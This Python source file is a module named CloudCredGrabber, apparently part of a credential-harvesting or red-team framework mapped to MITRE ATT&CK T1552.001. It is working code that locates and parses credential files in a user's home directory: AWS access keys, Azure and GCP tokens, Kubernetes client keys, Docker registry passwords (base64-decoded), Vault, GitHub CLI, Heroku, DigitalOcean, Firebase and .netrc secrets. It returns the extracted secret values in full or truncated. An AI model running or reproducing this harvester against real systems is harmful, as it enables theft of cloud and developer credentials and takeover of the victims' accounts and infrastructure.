"""
CloudCredGrabber — Extract cloud CLI credentials from known file locations

Targets:
- AWS: ~/.aws/credentials, ~/.aws/config (access keys, session tokens)
- Azure: ~/.azure/accessTokens.json, azureProfile.json, msal_token_cache.json
- GCP: ~/.config/gcloud/application_default_credentials.json, properties
- Kubernetes: ~/.kube/config (cluster certs, tokens, passwords)
- Docker: ~/.docker/config.json (registry auth tokens)
- Terraform: ~/.terraform.d/credentials.tfrc.json (cloud API tokens)
- Vault: ~/.vault-token (HashiCorp Vault token)
- GitHub CLI: ~/.config/gh/hosts.yml (personal access tokens)
- Heroku: ~/.config/heroku/credentials, ~/.netrc
- DigitalOcean: ~/.config/doctl/config.yaml
- Firebase: ~/.config/configstore/firebase-tools.json

All of these are plaintext or JSON — no crypto needed. Pure file-read.
MITRE ATT&CK: T1552.001 (Credentials In Files)
"""

from __future__ import annotations

import configparser
import json
import os
import re
from pathlib import Path

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text


class CloudCredGrabber(GrabberModule):
    name = "cloud_cred"
    description = "Extract cloud CLI credentials (AWS, Azure, GCP, k8s, Docker, Terraform, Vault)"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    # (path_template, parser_method_name, app_name)
    _TARGETS: list[tuple[str, str, str]] = [
        ("{home}/.aws/credentials", "_parse_aws_credentials", "AWS"),
        ("{home}/.aws/config", "_parse_aws_config", "AWS"),
        ("{home}/.azure/accessTokens.json", "_parse_json_tokens", "Azure"),
        ("{home}/.azure/azureProfile.json", "_parse_json_tokens", "Azure"),
        ("{home}/.azure/msal_token_cache.json", "_parse_json_tokens", "Azure"),
        ("{home}/.config/gcloud/application_default_credentials.json", "_parse_gcp_adc", "GCP"),
        ("{home}/.kube/config", "_parse_kube_config", "Kubernetes"),
        ("{home}/.docker/config.json", "_parse_docker_config", "Docker"),
        ("{home}/.terraform.d/credentials.tfrc.json", "_parse_json_tokens", "Terraform"),
        ("{home}/.vault-token", "_parse_vault_token", "Vault"),
        ("{home}/.config/gh/hosts.yml", "_parse_gh_cli", "GitHub CLI"),
        ("{home}/.config/heroku/credentials", "_parse_generic_text", "Heroku"),
        ("{home}/.config/doctl/config.yaml", "_parse_generic_text", "DigitalOcean"),
        ("{home}/.config/configstore/firebase-tools.json", "_parse_json_tokens", "Firebase"),
        ("{home}/.netrc", "_parse_netrc", "netrc"),
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        # At least one target file must exist
        for template, _, _ in self._TARGETS:
            path = template.format(home=context.user_profile_path)
            if os.path.isfile(path):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        for template, parser_name, app_name in self._TARGETS:
            path = template.format(home=context.user_profile_path)
            if not os.path.isfile(path):
                continue

            content = safe_read_text(path)
            if not content:
                continue

            try:
                parser = getattr(self, parser_name)
                creds = parser(path, content, app_name)
                result.credentials.extend(creds)

                if creds:
                    snippets = [f"{c.credential_type}: {c.username or c.url or 'token'}" for c in creds[:3]]
                    finding = self.make_finding(
                        file_path=path,
                        description=f"Extracted {len(creds)} credential(s) from {app_name}",
                        score=75 * min(len(creds), 3),
                        matched_value=app_name,
                        snippets=snippets,
                    )
                    result.findings.append(finding)

            except Exception as e:
                self.logger.debug(f"Failed to parse {path}: {e}")
                result.errors.append(f"{app_name}: {e}")

        result.status = GrabberStatus.COMPLETED
        return result

    # --- Parsers ---

    def _parse_aws_credentials(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
        """Parse AWS credentials INI file for access keys."""
        creds = []
        config = configparser.ConfigParser()
        config.read_string(content)

        for section in config.sections():
            key_id = config.get(section, "aws_access_key_id", fallback="")
            secret = config.get(section, "aws_secret_access_key", fallback="")
            token = config.get(section, "aws_session_token", fallback="")

            if key_id and secret:
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="key",
                    target_application=app,
                    username=f"[{section}] {key_id}",
                    decrypted_value=secret,
                    notes=f"session_token={'yes' if token else 'no'}",
                    mitre_technique="T1552.001",
                ))
        return creds

    def _parse_aws_config(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
        """Parse AWS config for role ARNs, SSO sessions, regions."""
        creds = []
        config = configparser.ConfigParser()
        config.read_string(content)

        for section in config.sections():
            role_arn = config.get(section, "role_arn", fallback="")
            sso_start_url = config.get(section, "sso_start_url", fallback="")
            if role_arn or sso_start_url:
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="token",
                    target_application=app,
                    username=section.replace("profile ", ""),
                    url=sso_start_url or role_arn,
                    notes=f"role_arn={role_arn}" if role_arn else f"sso={sso_start_url}",
                    mitre_technique="T1552.001",
                ))
        return creds

    def _parse_json_tokens(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
        """Generic JSON token file parser — extracts any key/token/secret fields."""
        creds = []
        try:
            data = json.loads(content)
        except json.JSONDecodeError:
            return creds

        # Walk the JSON tree looking for credential-like keys
        token_keys = {"token", "access_token", "accessToken", "refresh_token", "refreshToken",
                       "secret", "password", "api_key", "apiKey", "key", "credentials"}

        def _walk(obj: dict | list, prefix: str = "") -> None:
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if isinstance(v, str) and len(v) >= 10 and k.lower().replace("_", "") in {
                        s.lower().replace("_", "") for s in token_keys
                    }:
                        creds.append(ExtractedCredential(
                            source_module=self.name,
                            credential_type="token",
                            target_application=app,
                            username=prefix or k,
                            decrypted_value=v[:200],
                            mitre_technique="T1552.001",
                        ))
                    elif isinstance(v, (dict, list)):
                        _walk(v, prefix=f"{prefix}.{k}" if prefix else k)
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    if isinstance(item, (dict, list)):
                        _walk(item, prefix=f"{prefix}[{i}]")

        _walk(data)
        return creds

    def _parse_gcp_adc(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
        """Parse GCP application default credentials JSON."""
        creds = []
        try:
            data = json.loads(content)
        except json.JSONDecodeError:
            return creds

        cred_type = data.get("type", "unknown")
        client_id = data.get("client_id", "")
        client_secret = data.get("client_secret", "")
        refresh_token = data.get("refresh_token", "")
        project_id = data.get("quota_project_id", data.get("project_id", ""))

        if client_secret or refresh_token:
            creds.append(ExtractedCredential(
                source_module=self.name,
                credential_type="token",
                target_application=app,
                username=f"{cred_type} ({project_id})" if project_id else cred_type,
                url=client_id,
                decrypted_value=refresh_token or client_secret,
                mitre_technique="T1552.001",
            ))
        return creds

    def _parse_kube_config(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
        """Parse kubectl config for cluster credentials, tokens, client certs."""
        creds = []
        # kubectl config is YAML but we avoid PyYAML dep — use regex extraction
        # Look for token, password, client-certificate-data, client-key-data
        patterns = [
            (r"token:\s*(.{20,})", "token"),
            (r"password:\s*(\S+)", "password"),
            (r"client-key-data:\s*(\S+)", "client_key"),
            (r"client-certificate-data:\s*(\S+)", "client_cert"),
        ]
        for pattern, cred_type in patterns:
            for match in re.finditer(pattern, content):
                value = match.group(1).strip()
                if len(value) >= 10:
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type=cred_type,
                        target_application=app,
                        decrypted_value=value[:200],
                        mitre_technique="T1552.001",
                    ))

        # Extract cluster server URLs for context
        for match in re.finditer(r"server:\s*(https?://\S+)", content):
            creds.append(ExtractedCredential(
                source_module=self.name,
                credential_type="token",
                target_application=app,
                url=match.group(1),
                notes="cluster endpoint",
                mitre_technique="T1552.001",
            ))
        return creds

    def _parse_docker_config(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
        """Parse Docker config.json for registry auth tokens."""
        creds = []
        try:
            data = json.loads(content)
        except json.JSONDecodeError:
            return creds

        auths = data.get("auths", {})
        for registry, auth_data in auths.items():
            auth_b64 = auth_data.get("auth", "")
            if auth_b64:
                import base64
                try:
                    decoded = base64.b64decode(auth_b64).decode("utf-8", errors="ignore")
                    parts = decoded.split(":", 1)
                    username = parts[0] if parts else ""
                    password = parts[1] if len(parts) > 1 else ""
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="password",
                        target_application=app,
                        url=registry,
                        username=username,
                        decrypted_value=password,
                        mitre_technique="T1552.001",
                    ))
                except Exception:
                    pass
        return creds

    def _parse_vault_token(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
        """Parse HashiCorp Vault token file (single line)."""
        token = content.strip()
        if len(token) >= 10:
            return [ExtractedCredential(
                source_module=self.name,
                credential_type="token",
                target_application=app,
                decrypted_value=token,
                mitre_technique="T1552.001",
            )]
        return []

    def _parse_gh_cli(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
        """Parse GitHub CLI hosts.yml for OAuth tokens."""
        creds = []
        # YAML parsing without PyYAML — extract oauth_token lines
        for match in re.finditer(r"oauth_token:\s*(\S+)", content):
            token = match.group(1).strip()
            if len(token) >= 10:
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="token",
                    target_application=app,
                    decrypted_value=token,
                    mitre_technique="T1552.001",
                ))
        # Also extract hosts for context
        for match in re.finditer(r"^(\S+\.com):", content, re.MULTILINE):
            host = match.group(1)
            if creds:
                creds[-1].url = host
        return creds

    def _parse_netrc(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
        """Parse .netrc for machine/login/password entries."""
        creds = []
        # .netrc format: machine <host> login <user> password <pass>
        machines = re.findall(
            r"machine\s+(\S+)\s+login\s+(\S+)\s+password\s+(\S+)",
            content
        )
        for host, user, password in machines:
            creds.append(ExtractedCredential(
                source_module=self.name,
                credential_type="password",
                target_application=app,
                url=host,
                username=user,
                decrypted_value=password,
                mitre_technique="T1552.001",
            ))
        return creds

    def _parse_generic_text(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
        """Generic text credential parser — look for key=value patterns."""
        creds = []
        secret_keys = {"token", "api_key", "apikey", "secret", "password", "auth"}
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            for sep in ("=", ":", " "):
                if sep in line:
                    key, _, value = line.partition(sep)
                    key = key.strip().lower().replace("-", "_").replace(" ", "_")
                    value = value.strip().strip('"').strip("'")
                    if any(s in key for s in secret_keys) and len(value) >= 8:
                        creds.append(ExtractedCredential(
                            source_module=self.name,
                            credential_type="token",
                            target_application=app,
                            username=key,
                            decrypted_value=value[:200],
                            mitre_technique="T1552.001",
                        ))
                    break
        return creds
